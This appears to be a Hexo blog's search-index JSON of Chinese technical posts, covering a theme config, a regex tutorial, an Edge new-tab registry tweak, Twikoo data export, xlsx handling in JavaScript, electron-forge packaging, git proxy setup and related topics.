CDN、虹墨空间站评论区、Twikoo 官方文档评论区，已知同样受到攻击的还有 Waline 官方文档评论区和 hexo-theme-butterfly 主题评论区，无人承认发起了本次攻击，对本人造成的财产损失为 0，所有攻击波次都在短时间内得到处理。 处理攻击的原则： 预防攻击，网络攻击成本低，傻子都会，要常态化处理，任何网络服务都可能会受到攻击，防御工作是必须提前考虑的事项，设置合理的告警规则、提前留意云产品，尤其是 CDN 和云函数的计费规则，配置封顶，小心夜间攻击 防御攻击，分析异常流量特征（请求头、IP 的请求频率等），并拒绝对异常流量服务 无法防御，切换至 Cloudflare 等公共防御提供商 无法切换，关停以避免造成损失 article.article img { border: 1px solid #dbdbdb; }","link":"/2022/april-cc-log/"},{"title":"博客主题源码和配置文件","text":".heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } 今日收到打赏，付款方备注： 哈喽，你的虹墨空间站很棒啊！先单纯赞助下。另外想问下框架的源码方便提供吗？本人无前段经验，只想要个框架往里面添加笔记文档 请不要在打赏备注中提问问题…… 由于打赏无法直接回复，也看不到联系方式，所以在此回复：感谢打赏，博客框架的源码（也就是主题？）在这里可以找到：https://github.com/imaegoo/hexo-theme-icarus，具体用法和原版 hexo-theme-icarus 基本一致，您只需要按照 Hexo 主题的起步文档，就能很快搭建一个一模一样的出来了。 以下附上本站的完整主题配置文件，供有需要的朋友参考。 _config.icarus.yml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318# Version of the configuration fileversion: 5.1.0# Icarus theme variant, can be &quot;default&quot; or &quot;cyberpunk&quot;variant: default# Path or URL to the website's logologo: light: /images/logo.png dark: /images/logo-dark.png# Page metadata configurationshead: # URL or path to the website's icon favicon: /favicon.ico # Canonical URL of the current page #canonical_url: # Open Graph metadata # https://hexo.io/docs/helpers.html#open-graph #open_graph: # Page title (og:title) (optional) # You should leave this blank for most of the time #title: # Page type (og:type) (optional) # You should leave this blank for most of the time #type: blog # Page URL (og:url) (optional) # You should leave this blank for most of the time #url: # Page cover (og:image) (optional) Default to the Open Graph image or thumbnail of the page # You should leave this blank for most of the time #image: # Site name (og:site_name) (optional) # You should leave this blank for most of the time #site_name: # Page author (article:author) (optional) # You should leave this blank for most of the time #author: # Page description (og:description) (optional) # You should leave this blank for most of the time #description: # Twitter card type (twitter:card) #twitter_card: # Twitter ID (twitter:creator) #twitter_id: # Twitter ID (twitter:creator) #twitter_site: # Google+ profile link (deprecated) #google_plus: # Facebook admin ID #fb_admins: # Facebook App ID #fb_app_id: # Structured data of the page # https://developers.google.com/search/docs/guides/intro-structured-data structured_data: # Page title (optional) # You should leave this blank for most of the time title: # Page description (optional) # You should leave this blank for most of the time description: # Page URL (optional) # You should leave this blank for most of the time url: # Page author (article:author) (optional) # You should leave this blank for most of the time author: # Page images (optional) Default to the Open Graph image or thumbnail of the page # You should leave this blank for most of the time image: # Additional HTML meta tags in an array meta: # Meta tag specified in &lt;attribute&gt;=&lt;value&gt; style # E.g., name=theme-color;content=#123456 =&gt; &lt;meta name=&quot;theme-color&quot; content=&quot;#123456&quot;&gt; - '' # URL or path to the website's RSS atom.xml rss: /atom.xml# Page top navigation bar configurationsnavbar: # Naviagtion menu items menu: 首页: / 时间轴: /archives/ 分类: /categories/ 标签: /tags/ 网盘: 'https://imaegoo.azurewebsites.net' 留言板: /messages/ 友情链接: /friends/ 关于: /about/ # Links to be shown on the right of the navigation bar links: # Admin: # icon: fas fa-cog # url: 'https://admin.imaegoo.com'# Page footer configurationsfooter: # Links to be shown on the right of the footer section links: Creative Commons: icon: fab fa-creative-commons url: 'https://creativecommons.org/' Attribution 4.0 International: icon: fab fa-creative-commons-by url: 'https://creativecommons.org/licenses/by/4.0/deed.zh' icp: '豫ICP备18017229号'# Article related configurationsarticle: # Code highlight settings highlight: # Code highlight themes # https://github.com/highlightjs/highlight.js/tree/master/src/styles theme: atom-one-light # Show copy code button clipboard: true # Default folding status of the code blocks. Can be &quot;&quot;, &quot;folded&quot;, &quot;unfolded&quot; fold: unfolded # Whether to show thumbnail image for every article thumbnail: true # Whether to show estimated article reading time readtime: true # Whether to show updated time. For \\&quot;auto\\&quot;, shows article update time only when page.updated is set and it is different from page.date update_time: auto # Article licensing block licenses: Creative Commons: icon: fab fa-creative-commons url: 'https://creativecommons.org/' 'CC BY 4.0': 'https://creativecommons.org/licenses/by/4.0/deed.zh' # og_image og_image: /images/og_image.png# Search plugin configurations# https://ppoffice.github.io/hexo-theme-icarus/categories/Plugins/Search/search: type: insight json: /content.json# Comment plugin configurations# https://ppoffice.github.io/hexo-theme-icarus/categories/Plugins/Comment/comment: # Name of the comment plugin type: twikoo envId: https://twikoo.imaegoo.com jsUrl: /js/imaegoo/twikoo/1.6.7/twikoo.min.js # type: utterances # repo: imaegoo/imaegoo.github.io # issue_term: pathname # label: utterances # theme: preferred-color-scheme# Donate plugin configurationsdonates: # Alipay donate button configurations - type: alipay # Alipay qrcode image URL qrcode: '/images/alipay.jpg' # Wechat donate button configurations - type: wechat # Wechat qrcode image URL qrcode: '/images/wechat.png'# Share plugin configurations# https://ppoffice.github.io/hexo-theme-icarus/categories/Plugins/Share/# Sidebar configurations.# Please be noted that a sidebar is only visible when it has at least one widgetsidebar: # Left sidebar configurations left: # Whether the sidebar sticks to the top when page scrolls sticky: true # Right sidebar configurations right: # Whether the sidebar sticks to the top when page scrolls sticky: true# Sidebar widget configurations# http://ppoffice.github.io/hexo-theme-icarus/categories/Widgets/widgets: # Profile widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: left type: profile # Author name author: iMaeGoo # Author title author_title: 虹墨空间站 # Author's current location location: Zhengzhou, China # URL or path to the avatar image avatar: /images/avatar.jpg # Whether show the rounded avatar image avatar_rounded: true # Email address for the Gravatar gravatar: # URL or path for the follow button follow_link: 'https://space.bilibili.com/4750943' # Links to be shown on the bottom of the profile widget social_links: GitHub: icon: fab fa-github url: 'https://github.com/imaegoo' QQ: icon: fab fa-qq url: 'https://jq.qq.com/?_wv=1027&amp;k=2l9ZGIoL' Mail: icon: fas fa-envelope url: 'mailto:hello@imaegoo.com' RSS: icon: fas fa-rss url: '/atom.xml' # Archives widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: left type: archives # Categories widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: left type: categories # Tags widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: left type: tags # Recommendation links widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: left type: links # Names and URLs of the sites links: maemoの風船が！: 'https://maemo.cc' 米米的博客: 'https://zhangshuqiao.org' 辣椒の酱: 'https://removeif.github.io' Sakitami的集装箱: 'https://blog.skihome.xyz' 明月逐人归: 'https://mingshan.fun' 宇宙湾: 'https://yuzhouwan.com' Ray’s Blog: 'https://raycoder.me' # Google AdSense unit configurations #- # # Where should the widget be placed, left sidebar or right sidebar # position: left # type: adsense # # AdSense client ID # client_id: 'ca-pub-5716633754544549' # # AdSense AD unit ID # slot_id: '6035187824' # Table of contents widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: right type: toc # Recent posts widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: right type: recent_posts # Twikoo new comment widget configurations - # Where should the widget be placed, left sidebar or right sidebar position: right type: twikoo_new envId: https://twikoo.imaegoo.com# Plugin configurationsplugins: # Enable page startup animations animejs: false # Show the &quot;back to top&quot; button back_to_top: true # Baidu Analytics plugin settings # https://tongji.baidu.com baidu_analytics: # Baidu Analytics tracking ID tracking_id: 4d5b97d11341c6f57b58fc622dc1ac38 # BuSuanZi site/page view counter # https://busuanzi.ibruce.info busuanzi: true # Enable the lightGallery and Justified Gallery plugins # https://ppoffice.github.io/hexo-theme-icarus/Plugins/General/gallery-plugin/ gallery: true # Google Analytics plugin settings # https://analytics.google.com google_analytics: # Google Analytics tracking ID tracking_id: # Hotjar user feedback plugin # https://www.hotjar.com/ hotjar: # Hotjar site id site_id: # Enable the KaTeX math typesetting supprot # https://katex.org/ katex: false # Enable the MathJax math typesetting support # https://www.mathjax.org/ mathjax: false # Enable the Outdated Browser plugin # http://outdatedbrowser.com/ outdated_browser: false # Show a progress bar at top of the page on page loading progressbar: false cookie_consent: # 同意对话框类型。可以为&quot;info&quot;，&quot;opt-in&quot;，或&quot;opt-out&quot; type: info # 弹出框主题。可以为&quot;block&quot;，&quot;edgeless&quot;，或&quot;classic&quot; theme: edgeless # 是否使弹出框固定，不随页面滚动而滚动 static: false # 弹出框在屏幕上的位置 position: bottom-right # 你网站的Cookie协议的URL policyLink: '/cookies/'# CDN provider settings# https://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/speed-up-your-site-with-custom-cdn/providers: # Name or URL template of the JavaScript and/or stylesheet CDN provider cdn: host # Name or URL template of the webfont CDN provider fontcdn: host # Name or URL of the fontawesome icon font CDN provider iconcdn: host 完整的博客源码由于包含原始文章，为避免恶意的全站复制和转载，恕不会开源。","link":"/2022/dec-27/"},{"title":"七圣召唤卡牌表","text":"七圣召唤卡牌速查表，方便自己 Ctrl + F。 数据来源：米游社《牌手预演》小游戏。 数据整理：iMaeGoo GitHub：https://github.com/imaegoo/genius-invokation-cards GitHub Pages：https://gcards.imaegoo.com","link":"/2022/genius-invokation-cards/"},{"title":"GitHub Achievements 个人页已知成就统计","text":"Github 最近上线了成就系统，作为一个截至目前原神成就达 636 的老游戏成就党，你说成就我马上就不困了。这篇文章统计一下我已知的成就和获取方式。 图标 成就名 获取方式 Arctic Code Vault Contributor 绝版，提交过的代码在 2020 年被 GitHub Archive Program 北极代码库收录 Galaxy Brain 回答别人的 discussion 并被评为最佳答案 Pull Shark 提交的 PR 被合并 Starstruck 个人项目获得很多星（这里我不确定具体数目，我的成就写的是 512 stars） YOLO 不评审直接合并代码，目前逻辑是自己合并自己的也算，有较大争议的成就 Quickdraw 建立 issue 并在 5 分钟之内关掉，目前逻辑是自己关闭自己的也算 Pair Extraordinaire 创建多作者提交，发 PR，合并（关于如何创建多作者提交，请参考这篇帮助） Public Sponsor 赞助组织或用户","link":"/2022/github-achievements/"},{"title":"JavaScript 正则表达式学习","text":"本文作者: ych6666原文链接: https://blog.csdn.net/ych6666/article/details/122958097 正则表达式作用:描述了一个规则，通过这个规则可以匹配一类字符串。完成字符串的查找、验证和替换 创建12345678910111213141516// 1.字面量创建const str = &quot;abandon&quot;;const reg1 = /a/;console.log(reg1.test(str));// 2.对象创建const reg2 = new RegExp(&quot;a&quot;);console.log(reg2.test(str));// 区别// 字面量创建无法识别变量const v = 'a';const reg3 = /v/console.log(reg3.test(v)); //false//对象创建可以识别变量const reg4 = new RegExp(v);console.log(reg4.test(v)); //true// 但一般情况下，还是使用字面量创建更为常见 元字符 所有大写和小写字母、所有数字、所有标点符号和一些其他符号等没有特殊定义的标点符号，都是“普通字符”。 元字符均查找的是单个字符，匹配多个时需要加量词 对于需要匹配元字符本身时，进行转义 巧用元字符匹配所有字符：[\\s\\S] 、[\\d\\D] 元字符 描述 . 查找除了换行和行结束符以外的所有字符。 \\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个引用 / 正则边界符 ^n 边界符，匹配任何开头为 n 的字符串或表示“非” n$ 匹配任何结尾为 n 的字符串。 \\w 查找字母、数字、下划线 \\W 查找除了字母、数字、下划线的非单词字符。 \\d 查找数字。 \\D 查找非数字字符。 \\s 查找空白字符。 \\S 查找非空白字符。 \\n 查找换行符。 \\r 查找回车符。 量词 匹配数量 ? 表示量词或禁止贪婪 [] 原子表 () 原子组 断言匹配 相当于匹配条件 量词|- 量词仅作用于它前面紧跟的字符或组|| 量词 描述 n+ 匹配任何包含至少一个 n 的字符串。 n* 匹配任何包含零个或多个 n 的字符串。 n? 匹配任何包含零个或一个 n 的字符串。 n{X} 匹配包含 X 个 n 的序列的字符串。 n{X,Y} 匹配包含 X 至 Y 个 n 的序列的字符串。 n{X,} 匹配包含至少 X 个 n 的序列的字符串。 模式修正符模式修正符意在改变运行方式 模式 描述 i 不区分大小写 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止，只匹配一个叫做”不贪婪”）。 m 执行多行匹配。使边界字符 ^ 和 $ 匹配每一行的开头和结尾 模式可组合使用，不区分顺序，如： /gi 原子表[ ] 将中括号[ ]称为原子表(字符簇)，表示里面内容可选，去掉[ ]就表示完全匹配 [ ]用连字号-可以表示一个字符的范围，这些也只表示一个字符，这是一个非常重要的。 正则表达式中的大多特殊符号，如果被包含于中括号中，则失去特殊意义, 只表示字符本意，但 \\ [ ] : ^ - 除外。例如 “ .+ “在[ ]外面表示除换行符以外的其他字符，在[ ] 里面就只表示 . +本身，不论如何转义； ^ 在原子表中表示取反 ，例如 [ ^\\d ] 表示 “ 除了数字 “,^在外面仍表示开头；- 在原子表中表示连接符 [0-9] 常见原子表的使用 表达式 描述 [0-9] 查找任何从 0 至 9 的数字 [a-z] 查找任何从小写 a 到小写 z 的字符。 [A-Z] 查找任何从大写 A 到大写 Z 的字符。 [adgk] 查找给定集合内的任何字符。 [^adgk] 查找给定集合外的任何字符。 原子组（ ）正则表达式中以一对括号（）包裹的运算内容称为原子组, 但也有（）不是原子组的情况，需要区分 用处 12345const str = ` &lt;h1&gt;anxjas&lt;/h1&gt; &lt;h2&gt;xjsocniove&lt;/h2&gt; &lt;h3&gt;gjvhcfxd&lt;/h4&gt;`; 如上述内容，要想匹配出完整的h标签，正则需使用原子组：str.match( /&lt;h[1-6]&gt;.&lt;/h[1-6]&gt;/g )但会匹配出h标签前后不一致的数据为使前后保持一致，可使用原子组：str.match( /(&lt;h[1-6])&gt;.&lt;/\\1&gt;/g ) 原子组的引用 正则表达式中使用 \\ 后面加数字n表示与第n个原子组一致 \\1 \\2 \\3 ，依次从左往右数括号数量即可 在replace替换方法中直接使用 $ 符完成引用，$ 后面加数字n,表示第n个原子组，$n表示匹配到的第n个原子组的内容 12const reg1 = /&lt;(h[1-6])&gt;(.*)&lt;\\/\\1&gt;/ig;console.log(str.replace(reg1,'$2')); 在replace回调函数中，第一个参数是匹配到的整体剩余参数是原子组的组合，args[0]：匹配到的第一个原子组的内容 123456str.replace(reg,(v,...args)=&gt;{ console.log(v) console.log(args);; // v 即是正则匹配到的整体 // args是原子组的组合}) 3.原子组别名当觉得$1 $2 不够清晰明了时，可以为原子组起别名起名： （?&lt;自定义名称&gt;）使用： $&lt;自定义的名称&gt; 12const reg2 = /&lt;(h[1-6])&gt;(?&lt;two&gt;.*)&lt;\\/\\1&gt;/ig;console.log(str.replace(reg2,'$&lt;two&gt;')); 贪婪和禁止贪婪 “ ？”上面的量词中看到，” ? “表示0个或一个，表示可选；除此之外，“ ？”还有禁止贪婪的作用；如何区分？ 当“ ？”前面是量词，例如 + * {} ，表示禁止贪婪 1234567// 量词加？表示禁止贪婪，往最少的一个方向去const str = 'hddddd';console.log(str.match(/hd+/))console.log(str.match(/hd+?/));console.log(str.match(/hd*?/));console.log(str.match(/hd{2,}?/)); 当” ？“前面是除量词以外的普通字符、原子表或原子组，表示前面内容可选 断言匹配 断言就是指明某个字符串前边或者后边，将会出现满足某种规律的字符串。 断言匹配的（）不是原子组，不出现在匹配结果中 断言 描述 ?=n 匹配任何其后紧接指定字符串 n 的字符串。 ?!n 匹配任何其后没有紧接指定字符串 n 的字符串。 ?&lt;=n 匹配任何其前面紧接指定字符串 n 的字符串。 ?&lt;!n 匹配任何其前面没有紧接指定字符串 n 的字符串。 举例：电话号码模糊匹配 12345678const tel = '13578450356';const reg = /(?&lt;=\\d{7})\\d{4}/;console.log(tel.replace(reg,(v)=&gt;{ return &quot;*&quot;.repeat(4);})); 正则对象属性lastIndex 量词 描述 lastIndex 一个整数，标示开始下一次匹配的字符位置。 12345678910111213// 因为exec实际上是一个迭代器，正则有一个lastindex的属性，// 正则匹配检索到一个之后会暂停，从检索的位置再搜索，lastindex会变化，最后找不到的时候，lastindex为0// 统计字符出现次数const str = &quot;hello,world&quot;;const reg = /l/g;let count = 0;console.log(reg.lastIndex);while(res = reg.exec(str)){ count++; console.log(reg.lastIndex);}console.log(reg.lastIndex);console.log(count); 正则对象的方法 方法 描述 exec 匹配字符串，返回找到的值，并确定其位置。迭代器，lastindex test 在所搜索的字符串中是否存在正则表达式模式对应的匹配。返回 true 或 false。 正则验证 支持正则表达式的字符串方法 方法 描述 match 找到一个或多个正则表达式的匹配。 replace 替换与正则表达式匹配的子串。 split 根据正则匹配到的内容分割字符串数组。 search 搜索字符串中是否存在满足正则的字串，返回索引值","link":"/2022/js-regexp/"},{"title":"如何修改 Microsoft Edge 浏览器新标签页 URL","text":"Microsoft Edge 浏览器的新标签页固定为 https://ntp.msn.cn/edge/ntp，就这么一个新标签页，不仅加载慢，还有一堆控制台报错。然而浏览器还没有提供修改新标签页地址的功能。 虽然安装浏览器插件可以实现，但是浏览器插件修改新标签页时，会有弹窗提示插件修改了新标签页。本文提供一种通过注册表完美修改新标签页的方法，已在 Microsoft Edge 版本 99.0.1150.46 测试有效。Win 10 家庭版 / Win 11 家庭版无效。 新建一个 edge-policies.reg 注册表文件，内容如下： 12345678910111213141516171819Windows Registry Editor Version 5.00; # Fake MDM-Enrollment - Key 1 of 2 - let a Win10 Machine &quot;feel&quot; MDM-Managed[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Enrollments\\FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF] &quot;EnrollmentState&quot;=dword:00000001 &quot;EnrollmentType&quot;=dword:00000000 &quot;IsFederated&quot;=dword:00000000; # Fake MDM-Enrollment - Key 2 of 2 - let a Win10 Machine &quot;feel&quot; MDM-Managed[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Provisioning\\OMADM\\Accounts\\FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF]&quot;Flags&quot;=dword:00d6fb7f&quot;AcctUId&quot;=&quot;0x000000000000000000000000000000000000000000000000000000000000000000000000&quot;&quot;RoamingCount&quot;=dword:00000000&quot;SslClientCertReference&quot;=&quot;MY;User;0000000000000000000000000000000000000000&quot;&quot;ProtoVer&quot;=&quot;1.2&quot;; # 修改下文中的 &quot;about:blank&quot; 为你想要展示的新标签页的地址[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Edge\\Recommended]&quot;NewTabPageLocation&quot;=&quot;about:blank&quot; 双击该注册表文件，导入注册表。 打开 Microsoft Edge，从地址栏输入 edge://policy/ 打开，点击 “重新加载策略”，如果看到 NewTabPageLocation 的状态为 “确定”，你就成功了。 如果看到 NewTabPageLocation 的状态为错误，请按下 Win + R 组合键，输入 gpedit.msc 确定，打开组策略，再依此配置以下两项： 计算机配置 - 管理模板 - Windows 组件 - Microsoft Edge - 设置新建标签页 URL - 已启用，并在选项中输入 about:blank 用户配置 - 管理模板 - Windows 组件 - Microsoft Edge - 设置新建标签页 URL - 已启用，并在选项中输入 about:blank 想知道原理？我们先看 Microsoft Edge - 策略 这篇文档的官方解释： NewTabPageLocation配置新选项卡页 URL此策略确定创建新选项卡时（包括打开新窗口时）打开的页面。 如果启动页设置为打开新选项卡页，则该策略也会影响启动页。 此策略仅在加入 Microsoft Active Directory 域的 Windows 实例、已注册设备管理的 Windows 10 专业版或企业版实例，或者通过 MDM 托管或通过 MCX 加入域的 macOS 实例上可用。 我们未加域的个人电脑直接修改这个策略是不会生效的，以上注册表文件可以让浏览器 “以为” 系统通过 MDM 托管，从而使 NewTabPageLocation 策略生效。 参考文章：Edge Policies for non-Domain-joined Devices","link":"/2022/set-edge-new-tab-url/"},{"title":"有一家电影院……","text":"一次偶然，你踏进了一家电影院。 这家电影院环境舒适，设备先进，还是个大牌子影城。但因为是一家新开的电影院，生意并不怎么好。 电影院为你这样的第一批访客送出一张会员卡，有效期五年内，每个月都可以免费观看两场电影。 你十分高兴，不仅给电影院提出了一些改进建议，还推荐了许多身边的人前来观看。 于是，电影院的生意越来越好，后来的人虽然没有能免费观影的会员卡，但也能以特惠价看到不错的电影。 两年过去了，突然有一天—— 电影院宣布会员制升级，取消特惠价，而你需要支付三倍于以往会员的价格，成为新会员，如果不升级，你的老会员卡也会跟着作废。 你前去质问电影院为什么没到期会员卡也要作废，电影院只吐出五个字“会员制升级”，并排出两张你没见过的用户协议。 你非常生气，没有办理新会员，从此再没去过这家电影院。 多年之后回想起这件事，你已然记不清影院的名字，只能依稀记得影院的缩写 tcb，还有个似乎已经不再使用的老域名 qcloud.com","link":"/2022/the-cinema/"},{"title":"Twikoo 评论数据导出教程","text":"因为数据库导出还算方便，所以 Twikoo 没有提供内置的数据导出功能。想要导出数据的话，首先确认自己部署 Twikoo 所用的方式，然后参考下面的教程。 导出 Twikoo 在腾讯云的数据 登录 腾讯云； 打开云开发 CloudBase； 选择要导出的环境； 点击左侧的数据库，点击 comment 集合，点击导出按钮； 导出格式选择 JSON（推荐，如果想用 Excel 等软件查看，可以选择 CSV），字段不填； 点击导出按钮，导出的数据会通过浏览器自动下载。 导出 Twikoo 在 Vercel 的数据 下载并安装 MongoDB 数据库工具（下载地址：https://www.mongodb.com/try/download/database-tools）； 登录 Vercel 管理后台，点开 Twikoo 的环境，点击上方的 Settings，点击左侧的 Environment Variables，在页面下方找到 MONGODB_URI，点击对应的小眼睛图标，会出现数据库连接地址，点击以复制这串地址； 如果地址中包含参数，请先删去参数，参数即 “?” 和 “?” 后面的部分，例如 ?journal=true&amp;w=majority； 打开一个命令行窗口，粘贴以下命令： 记得替换中间的地址1mongoexport --uri 这里换成刚才复制的地址 --collection comment --type json --out twikoo-comments.json 如果成功，你可以在当前目录下找到导出的 twikoo-comments.json 文件。 参考文档MongoDB Documentation - mongoexport","link":"/2022/twikoo-data-export/"},{"title":"纯前端实现 Excel 表格的读取与生成（json 转 xlsx，xlsx 转 json）","text":"需求利用现有的查询和新增接口，如何在不改后端的情况下给页面增加导入和导出功能？ 前端查询到数据，可以生成 xlsx 文件吗？ 前端可以读取用户选择的 xlsx 文件，然后调用新增接口向后端写入数据吗？ 可以！ 安装 xlsx 库通过 npm 安装 1npm install xlsx 或者通过 CDN 引入（不推荐） 1&lt;script src=&quot;https://unpkg.com/xlsx/dist/xlsx.full.min.js&quot;&gt;&lt;/script&gt; 我安装的是 0.18.5 版本 编写导入功能12345678910111213141516171819202122232425262728import { utils, read } from 'xlsx'/** * xlsx 转 js 对象 * @param {File} file 可以从 &lt;input type=&quot;file&quot;&gt; 的 change 事件中获取到，可以参考项目使用的 UI 库的文档，这里省略具体步骤 * @returns {Promise&lt;Array&lt;Object&gt;&gt;} */function importXlsx(file) { return new Promise((resolve, reject) =&gt; { const reader = new FileReader() reader.onload = (event) =&gt; { try { const data = event.target.result // 读取工作簿 const workbook = read(data, { type: 'binary' }) // 读取第一个工作表，如需读取指定工作表，请改为 workbook.Sheets['工作表名称'] const sheet = workbook.Sheets[workbook.SheetNames[0]] // 将工作表转为 js 对象 const json = utils.sheet_to_json(sheet) resolve(json) } catch (e) { reject(e) } } reader.onerror = reject reader.readAsBinaryString(file) })} 通过以上方法得到的是一个 js Array 对象，表头会自动转化为对象键，表内容会自动转化为对象值，例如—— 工号 姓名 1000 张三 1001 李四 会被转换为—— 12345678910[ { 工号: '1000', 姓名: '张三', }, { 工号: '1001', 姓名: '李四', }] 编写导出功能123456789101112import { utils, writeFile } from 'xlsx'/** * js 对象转 xlsx，如果在浏览器中运行会触发文件下载 * @param {Array&lt;Object&gt;} data */function exportXlsx(data) { const book = utils.book_new() const sheet = utils.json_to_sheet(data) utils.book_append_sheet(book, sheet) writeFile(book, 'imaegoo.xlsx')} 与前面的导入功能正好相反，导出时对象键会自动转化为表头，对象值会自动转化为表内容—— 12345678910[ { id: '1000', name: '张三', }, { id: '1001', name: '李四', }] 会被转换为—— id name 1000 张三 1001 李四 为了规范导出的表头，建议先通过 map 方法生成好导出对象结构，再调用导出方法—— 1234567891011/** * 生成导出对象结构 */function parseData(data) { return data.map((r) =&gt; { return { 工号: r.id, 姓名: r.name } })} 有意思的是，xlsx.writeFile 方法同时支持 node.js 和浏览器环境，在 node.js 环境运行会将文件写入当前路径，在浏览器环境运行会触发文件下载。","link":"/2022/xlsx-js/"},{"title":"解决蓝牙鼠标卡顿","text":"蓝牙鼠标的一大好处是不占用任何笔记本电脑接口，适用于USB Type-A接口不够甚至无接口的笔记本电脑使用。目前最便宜的蓝牙鼠标只需50元左右。缺点是灵敏度和延迟都比传统有线鼠标和2.4G无线鼠标差。有时还会遇到卡顿、断线的情况，可以用以下办法排查一下。 鼠标电量低——需要更换电池或者充电，电池推荐用南孚、小米等碱性电池，不要用碳性电池。 蓝牙开了省电——在设备管理器中找到蓝牙设备属性里的电源管理，把“允许计算机关闭此设备以节约电源”勾掉。 无线网卡忙——绝大多数笔记本，蓝牙和WiFi是由同一个无线网卡驱动的，如果正在使用WiFi下载东西，蓝牙带宽就会受限，导致鼠标变卡，这种情况可以给下载限速或者改用有线网络。 蓝牙信号干扰——推荐买双模的无线鼠标，如果蓝牙被干扰了就暂时改用2.4G接收器。 桌面介质——不雅在玻璃等介质上使用鼠标，最好垫个鼠标垫。 驱动程序——有时候更新显卡驱动，更新蓝牙驱动能解决问题。","link":"/2023/bt-mouse-stuck/"},{"title":"electron-forge 流水线踩坑记录","text":"环境变量 环境变量 PATH 需包含 node、git 的可执行文件目录 在中国大陆跑，建议替换阿里镜像源提升依赖安装速度 123registry=https://registry.npmmirror.com/ELECTRON_MIRROR=https://npmmirror.com/mirrors/electron/NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node/ 安装包打包 Windows 推荐用 Inno Setup 打包，有以下好处：无需管理员权限可安装；可以自选安装路径；安装界面可定制程度高；安装界面比较现代化；打包工具有详细的帮助文档；支持流水线通过命令打包。为什么不推荐 @electron-forge/maker-squirrel？因为这种安装包格式双击会直接安装，没有任何提示，很违背 Windows 用户的操作习惯，无法自选安装路径。另外，VSCode 的安装包也在用 Inno Setup。Inno Setup 本身并不大，我们可以对它做个二次封装，方便流水线环境调用。 Linux 推荐用 @electron-forge/maker-deb，大部分 Linux 桌面系统都支持 Mac 推荐用 @electron-forge/maker-dmg 如果没有安装需求，直接用 @electron-forge/maker-zip 依赖环境 如果在 CentOS、RedHat 等 yum 软件包格式的系统上打 deb 格式安装包，需要安装 dpkg 和 fakeroot，安装命令如下 1234# CentOSsudo yum -y install epel-releasesudo yum repolistsudo yum -y install dpkg-devel dpkg-dev fakeroot 在银河麒麟 V10 服务器操作系统容器中跑，架构是 aarch64，遇到 lzma-native 包的 postinstall 脚本报错，需要安装 C++ 编译器，安装命令如下 1sudo yum install gcc gcc-c++ make -y","link":"/2023/electron-forge-try/"},{"title":"导出百度地图收藏点列表","text":"打开百度地图 https://map.baidu.com/fav/，登录自己的账号，按 F12 打开控制台，点击 Network，再按 F5 刷新页面，在 Filter 中输入 favdata，即可筛选出收藏点的 API 接口。如果你的收藏点多于 100 个，你会筛选出多个请求。依次点击每个请求，点击 Preview，展开 sync - newdata，右键 newdata，点击 Copy object 即可复制出来收藏数据。 不要去复制 Response 里的内容，里面的中文是 \\uxxxx 这种转义的格式。 接下来把每个请求复制出来的 newdata 整理到一个文件当中，再写一段代码转换为 Excel 格式方便查看。 123456789101112131415161718192021const { utils, writeFile } = require(&quot;xlsx&quot;);const fav = [ // 你的数据...];const rows = [];for (const loc of fav) { if (loc?.detail?.data?.sourcedata || loc?.detail?.data?.extdata) { rows.push({ ...loc.detail.data.sourcedata, ...loc.detail.data.extdata, }); }}const worksheet = utils.json_to_sheet(rows);const workbook = utils.book_new();utils.book_append_sheet(workbook, worksheet, &quot;收藏&quot;);writeFile(workbook, &quot;百度地图收藏.xlsx&quot;); 用 Node.js 跑一下，再打开生成的 百度地图收藏.xlsx 稍微整理一下格式，搞定！位置名称、地址、经纬度信息都有。","link":"/2023/export-baidu-map-fav/"},{"title":"git clone ssh 走代理","text":"新建一个 C:\\Users\\你的用户名\\.ssh\\config 文件（没有扩展名，如果已存在此文件则不用新建），编辑此文件增加以下内容： 123Host github.com *.github.com User git ProxyCommand connect -S 127.0.0.1:7890 %h %p 其中 Host 右边为需要走代理的域名列表，127.0.0.1:7890 替换为自己的代理服务器地址。 git clone http(s) 走代理12git config --global http.proxy &quot;http://127.0.0.1:7890&quot;git config --global https.proxy &quot;http://127.0.0.1:7890&quot; 其中 127.0.0.1:7890 替换为自己的代理服务器地址。","link":"/2023/git-clone-ssh-proxy/"},{"title":"Hexo 博客集成内容管理系统 Decap","text":"背景一开始在做个人博客的框架选型时，我考虑过 WordPress、Typecho 等 PHP 框架，它们都自带一个内容管理系统，非常便于管理。但因为不想在服务器上花太多成本，我仍然选择了 Hexo 这种静态博客生成器，因为有很多优秀的静态博客托管平台可以选择。从此开始了一段博客折腾之旅。 曾经我也向朋友推荐 Hexo，列举它的种种优点，现在我也开始觉得 Hexo 写作太繁琐了。 静态博客最主要的缺点，一是不支持评论，二是缺少一个后台。不支持评论，写好的内容，无法与读者交流，是一件挺痛苦的事情。为此我搜遍互联网，最终选择了自己开发 Twikoo 无服务器评论系统，评论这件难题算是解决了。 缺少后台，便无法专注于写作，在 IDE（集成开发环境）里写博客是个很奇妙的体验，总觉得自己写的并不是博客，而是某个程序。插入图片也是个大难题，本来一个 Ctrl + V 